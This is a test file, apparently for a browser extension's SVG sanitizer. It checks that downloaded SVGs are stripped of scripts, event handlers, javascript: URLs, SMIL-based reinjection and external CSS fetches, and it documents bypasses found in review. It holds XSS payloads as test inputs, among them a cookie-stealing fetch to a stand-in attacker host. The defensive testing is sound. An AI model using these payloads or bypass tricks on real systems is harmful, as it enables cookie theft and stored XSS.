import { describe, expect, it } from 'vitest';
import { formatSVGContent } from '../extension/svg-utils.js';

// A downloaded .svg is a live document, not an inert image: it executes when
// opened from file:// and becomes stored XSS when inlined into a CMS that
// trusts uploaded SVG. formatSVGContent is the single choke point every
// download path routes through, so the sanitizer is pinned here.
describe('formatSVGContent sanitization', () => {
  const wrap = (inner) => `<svg xmlns="http://www.w3.org/2000/svg">${inner}</svg>`;

  it('strips <script> elements', async () => {
    const out = await formatSVGContent(
      wrap('<path d="M0 0"/><script>fetch("https://attacker.tld/?c=" + document.cookie)</script>')
    );
    expect(out).not.toContain('<script');
    expect(out).not.toContain('attacker.tld');
    expect(out).toContain('<path');
  });

  it('strips <foreignObject>, which can carry arbitrary HTML', async () => {
    const out = await formatSVGContent(
      wrap('<foreignObject><body xmlns="http://www.w3.org/1999/xhtml">hi</body></foreignObject>')
    );
    expect(out).not.toContain('foreignObject');
  });

  it('removes event handler attributes but keeps the element', async () => {
    const out = await formatSVGContent(
      wrap('<rect width="10" height="10" onload="alert(1)" onclick="alert(2)"/>')
    );
    expect(out).not.toContain('onload');
    expect(out).not.toContain('onclick');
    expect(out).not.toContain('alert');
    expect(out).toContain('<rect');
    expect(out).toContain('width="10"');
  });

  it('drops javascript: URLs while keeping the element', async () => {
    const out = await formatSVGContent(
      wrap('<a xlink:href="javascript:alert(1)"><rect width="5" height="5"/></a>')
    );
    expect(out).not.toContain('javascript:');
    expect(out).toContain('<rect');
  });

  it('sees through whitespace controls used to disguise a scheme', async () => {
    // Browsers ignore embedded tabs and newlines when resolving a scheme, so
    // a tab-split `java<TAB>script:` navigates exactly like `javascript:`.
    // Both are legal XML, so the parser hands them straight through and the
    // sanitizer has to normalize before matching. (A NUL byte, by contrast, is
    // invalid XML and never survives the parse at all.)
    const tab = await formatSVGContent(wrap(`<a href="java\u0009script:alert(1)"><rect/></a>`));
    expect(tab).not.toContain('script:');

    const nl = await formatSVGContent(wrap(`<a href="java\u000ascript:alert(1)"><rect/></a>`));
    expect(nl).not.toContain('script:');
  });
  it('keeps internal fragment refs and ordinary image URLs', async () => {
    const out = await formatSVGContent(
      wrap('<use href="#icon"/><image href="https://cdn.example.com/a.png"/>')
    );
    expect(out).toContain('#icon');
    expect(out).toContain('https://cdn.example.com/a.png');
  });

  it('removes animations that rewrite a URL attribute after load', async () => {
    // Without this, <animate> reintroduces exactly what the attribute pass
    // just removed, one tick after the document loads.
    const out = await formatSVGContent(
      wrap('<a href="#safe"><animate attributeName="href" to="javascript:alert(1)"/></a>')
    );
    expect(out).not.toContain('javascript:');
    expect(out).not.toContain('<animate');
  });

  it('keeps animations that drive ordinary presentation attributes', async () => {
    const out = await formatSVGContent(
      wrap('<rect><animate attributeName="opacity" from="0" to="1" dur="1s"/></rect>')
    );
    expect(out).toContain('<animate');
    expect(out).toContain('opacity');
  });

  it('drops an internal DTD subset', async () => {
    const out = await formatSVGContent(
      '<!DOCTYPE svg [<!ENTITY x "y">]><svg xmlns="http://www.w3.org/2000/svg"><path d="M0 0"/></svg>'
    );
    expect(out).not.toContain('DOCTYPE');
    expect(out).not.toContain('ENTITY');
  });
});

// ensureXlinkDeclared performs string surgery on untrusted markup *before* the
// parse, which is exactly where sanitizer bypasses come from. These pin the two
// ways the naive version corrupted its own output.
describe('ensureXlinkDeclared robustness', () => {
  it('does not expand $-patterns from page markup as replacement templates', async () => {
    const out = await formatSVGContent(
      `<svg xmlns="http://www.w3.org/2000/svg" data-x="$'"><use xlink:href="#a"/><path d="M0 0"/></svg>`
    );
    expect(out).not.toContain('parsererror');
    // The naive version spliced a copy of the trailing markup into the attribute.
    expect(out.match(/<path/g)).toHaveLength(1);
  });

  it('is not fooled by a > inside a quoted attribute value', async () => {
    const out = await formatSVGContent(
      '<svg xmlns="http://www.w3.org/2000/svg" data-a="a>b"><use xlink:href="#i"/></svg>'
    );
    expect(out).not.toContain('parsererror');
    expect(out).toContain('xmlns:xlink="http://www.w3.org/1999/xlink"');
  });
});

// Bypasses found by adversarial review of the first sanitizer implementation.
// Each of these produced fully intact attacker markup before the fix.
describe('formatSVGContent sanitization — bypass regressions', () => {
  it('strips a javascript: URL bound to a non-standard xlink prefix', async () => {
    // `xlink:` is only a convention. Matching the literal string 'xlink:href'
    // let any other prefix bound to the XLink namespace straight through.
    const out = await formatSVGContent(
      '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xl="http://www.w3.org/1999/xlink">' +
        '<a xl:href="javascript:alert(1)"><rect width="5" height="5"/></a></svg>'
    );
    expect(out).not.toContain('javascript:');
    expect(out).toContain('<rect');
  });

  it('removes SMIL that reinstates an event handler after load', async () => {
    // The attribute pass strips on* from markup; <set> puts it back one tick
    // later. Guarding only URL attributeNames left this open.
    const out = await formatSVGContent(
      '<svg xmlns="http://www.w3.org/2000/svg"><rect>' +
        '<set attributeName="onmouseover" to="alert(1)"/></rect></svg>'
    );
    expect(out).not.toContain('onmouseover');
    expect(out).not.toContain('<set');
  });

  it('removes SMIL targeting a prefixed href', async () => {
    const out = await formatSVGContent(
      '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xl="http://www.w3.org/1999/xlink">' +
        '<a xl:href="#safe"><animate attributeName="xl:href" to="javascript:alert(1)"/></a></svg>'
    );
    expect(out).not.toContain('javascript:');
    expect(out).not.toContain('<animate');
  });

  it('keeps relative URLs, which cannot carry a scheme', async () => {
    // Allow-listing by shape rejected every relative URL, so <use> lost its
    // href entirely and the file downloaded blank with no error.
    const out = await formatSVGContent(
      '<svg xmlns="http://www.w3.org/2000/svg">' +
        '<image href="logo.png" width="10" height="10"/><use href="sprite.svg#i"/></svg>'
    );
    expect(out).toContain('logo.png');
    expect(out).toContain('sprite.svg#i');
  });

  it('still rejects non-http schemes that are not data:image', async () => {
    const out = await formatSVGContent(
      '<svg xmlns="http://www.w3.org/2000/svg">' +
        '<a href="vbscript:msgbox(1)"><rect/></a>' +
        '<image href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="/>' +
        '<image href="file:///etc/passwd"/></svg>'
    );
    expect(out).not.toContain('vbscript:');
    expect(out).not.toContain('data:text/html');
    expect(out).not.toContain('file://');
  });

  it('rejects data:image/svg+xml, the one image type that carries markup', async () => {
    // Every other data:image/* is inert bytes. svg+xml is a document, so
    // allow-listing it round-tripped a script past every check above.
    const out = await formatSVGContent(
      '<svg xmlns="http://www.w3.org/2000/svg">' +
        '<a href="data:image/svg+xml,%3Csvg onload=alert(1)%3E"><rect/></a></svg>'
    );
    expect(out).not.toContain('data:image/svg+xml');
    expect(out).toContain('<rect');
  });

  it('removes animateColor, which the tag allow-list missed', async () => {
    // Keyed on `attributeName` now rather than on a list of animation tags:
    // enumerating SMIL element names is a game you lose once.
    const out = await formatSVGContent(
      '<svg xmlns="http://www.w3.org/2000/svg"><a href="#safe">' +
        '<animateColor attributeName="href" to="javascript:alert(1)"/></a></svg>'
    );
    expect(out).not.toContain('javascript:');
    expect(out).not.toContain('animateColor');
  });
});

// CSS is neutralized rather than dropped: real exports from Illustrator, Figma
// and Inkscape carry their paint in <style> and style=, so stripping it wholesale
// would repaint every download flat.
describe('formatSVGContent CSS handling', () => {
  it('strips @import and external url() from a <style> block', async () => {
    const out = await formatSVGContent(
      '<svg xmlns="http://www.w3.org/2000/svg"><style>' +
        '@import url("//attacker.tld/x.css"); .a { fill: red; }' +
        '.b { background-image: url(http://attacker.tld/beacon.png); }' +
        '</style><rect class="a" width="5" height="5"/></svg>'
    );
    expect(out).not.toContain('@import');
    expect(out).not.toContain('attacker.tld');
    // The paint survives — that is the whole point of not dropping <style>.
    expect(out).toContain('fill: red');
  });

  it('strips an external url() from a style attribute', async () => {
    const out = await formatSVGContent(
      '<svg xmlns="http://www.w3.org/2000/svg">' +
        '<rect style="fill:blue;background:url(http://attacker.tld/beacon)"/></svg>'
    );
    expect(out).not.toContain('attacker.tld');
    expect(out).toContain('fill:blue');
  });

  it('keeps url(#id), which wires up gradients, masks and filters', async () => {
    // These reference nodes inside the same document and reach nothing external.
    // Neutralizing them would break every gradient-filled export.
    const out = await formatSVGContent(
      '<svg xmlns="http://www.w3.org/2000/svg">' +
        '<defs><linearGradient id="g"><stop offset="0"/></linearGradient></defs>' +
        '<rect style="fill:url(#g)" width="5" height="5"/></svg>'
    );
    expect(out).toContain('url(#g)');
  });
});
